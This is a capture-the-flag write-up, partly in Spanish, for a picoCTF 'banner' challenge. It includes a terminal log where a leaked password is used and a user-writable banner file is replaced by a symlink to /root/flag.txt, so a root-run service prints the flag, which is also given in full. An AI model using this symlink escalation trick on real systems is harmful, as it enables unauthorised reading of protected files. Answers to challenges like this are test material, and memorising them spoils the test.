#### Description

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 54003`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 51487`. From the above information abuse the machine and find the flag in the /root directory.

---

**Solución**

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

**Notas adicionales**

```
fergll@FerGLl:/mnt/c/Users/ferch/Documents$ nc tethys.picoctf.net 51487
*********************************************
***************DEFAULT BANNER****************
*Please supply banner in /home/player/banner*
*********************************************
what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
def con
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ cd /home/player
cd /home/player
player@challenge:~$ ln -sf /root/flag.txt banner
ln -sf /root/flag.txt banner
player@challenge:~$ ls -l banner
ls -l banner
lrwxrwxrwx 1 player player 14 Mar 21 18:07 banner -> /root/flag.txt
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ^C
fergll@FerGLl:/mnt/c/Users/ferch/Documents$ nc tethys.picoctf.net 51487
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

```

- **Extracción:** Se obtuvo la contraseña y versión de un servicio secundario usando `nc` (**Banner Grabbing**).
    
- **Acceso:** Se entro al servidor principal respondiendo preguntas de cultura hacker (**DEF CON** y **John Draper**).
    
- **Engaño:** Se borro el archivo de bienvenida (`banner`) y se creo un enlace simbólico que apuntaba a la flag (`ln -s /root/flag.txt banner`).

Referencias


